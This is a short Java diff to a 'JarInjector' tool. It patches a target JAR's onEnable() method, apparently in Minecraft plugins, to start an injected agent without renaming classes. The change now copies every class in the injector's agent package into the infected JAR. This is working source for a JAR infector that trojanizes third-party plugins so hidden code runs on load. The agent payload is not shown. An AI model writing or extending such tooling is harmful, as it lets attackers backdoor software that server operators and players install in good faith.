@@ -71,9 +71,19 @@ public class JarInjector {
     // Inject agent startup into onEnable() - NO class renaming
     entries.put(mainPath, injectOnEnable(mainData));
 
-    // Copy compiled agent class from classpath into target JAR
-    InputStream in = getClass().getClassLoader().getResourceAsStream(AGENT_CLASS);
-    if (in != null) entries.put(AGENT_CLASS, IOUtils.toByteArray(in));
+    // Copy all compiled agent classes from injector's own JAR into target JAR
+    java.net.URL loc = getClass().getProtectionDomain().getCodeSource().getLocation();
+    try (JarFile self = new JarFile(new File(loc.toURI()))) {
+      Enumeration<JarEntry> selfEntries = self.entries();
+      while (selfEntries.hasMoreElements()) {
+        JarEntry se = selfEntries.nextElement();
+        if (se.getName().startsWith(AGENT_PKG) && se.getName().endsWith(".class")) {
+          try (InputStream in2 = self.getInputStream(se)) {
+            entries.put(se.getName(), IOUtils.toByteArray(in2));
+          }
+        }
+      }
+    }
 
     try (JarOutputStream jos = new JarOutputStream(new FileOutputStream(output))) {
       for (Map.Entry<String, byte[]> en : entries.entrySet()) {
